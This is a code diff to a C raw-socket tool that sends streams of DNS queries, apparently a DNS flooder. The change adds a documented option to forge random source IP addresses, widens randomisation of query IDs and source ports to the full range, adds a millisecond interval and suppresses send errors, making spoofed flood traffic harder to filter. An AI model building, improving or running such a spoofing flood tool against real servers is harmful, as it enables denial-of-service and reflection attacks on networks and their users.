@@ -134,8 +134,9 @@ void usage(char *progname)
 			"\t-s, --source-ip\t\tsource ip\n"
 			"\t-p, --dest-port\t\tdestination port\n"
 			"\t-P, --src-port\t\tsource port\n"
-			"\t-i, --interval\t\tinterval between two packets\n"
+			"\t-i, --interval\t\tinterval (in millisecond) between two packets\n"
 			"\t-n, --number\t\tnumber of DNS requests to send\n"
+			"\t-r, --random\t\tfake random source IP\n"
 			"\t-D, --daemon\t\trun as daemon\n"
 			"\t-h, --help\n"
 			"\n"
@@ -209,13 +210,6 @@ int make_question_packet(char *data, char *name, int type)
 	return (strlen(data) + 5);
 }
 
-int myrand(int rand_max)
-{
-	int j;
-	j = 1 + (int) ((rand_max * 1.0) * rand() / (RAND_MAX + 1.0));
-	return (j);
-}
-
 int read_ip_from_file(char *filename)
 {
 }
@@ -235,7 +229,6 @@ int main(int argc, char **argv)
 
 	int random_ip = 0;
 	int static_ip = 0;
-	char namefake[16];
 
 	int arg_options;
 
@@ -290,6 +283,7 @@ int main(int argc, char **argv)
 
 		case 'r':
 			random_ip = 1;
+			srandom((unsigned long)time(NULL));
 			break;
 
 		case 'D':
@@ -399,13 +393,10 @@ int main(int argc, char **argv)
 		ssize_t ret;
 
 		if (random_ip) {
-			sprintf(namefake, "%d.%d.%d.%d", myrand(150.0), myrand(150.0),
-					myrand(150.0), myrand(150.0));
-
-			inet_pton(AF_INET, namefake, &src_ip);
+			src_ip.s_addr = random();
 		}
 
-		dns_header->id = 6000 + myrand(150.0);	/* random query id        */
+		dns_header->id = random();
 		dns_datalen = make_question_packet(dns_data, qname, TYPE_A);
 
 		udp_datalen = sizeof(struct dnshdr) + dns_datalen;
@@ -413,7 +404,7 @@ int main(int argc, char **argv)
 
 		/* update UDP header*/
 		if (!src_port) {
-			udp->uh_sport = htons(1337 + myrand(150.0));
+			udp->uh_sport = htons(random() % 65535);
 		}
 		udp->uh_ulen = htons(sizeof(struct udphdr) + udp_datalen);
 		udp->uh_sum = 0;
@@ -429,7 +420,7 @@ int main(int argc, char **argv)
 		ret = sendto(sock, iphdr, sizeof(struct ip) + ip_datalen, 0,
 				(struct sockaddr *) &sin_dst, sizeof(struct sockaddr));
 		if (ret == -1) {
-			perror("sendto error");
+			// perror("sendto error");
 		}
 
 		count++;
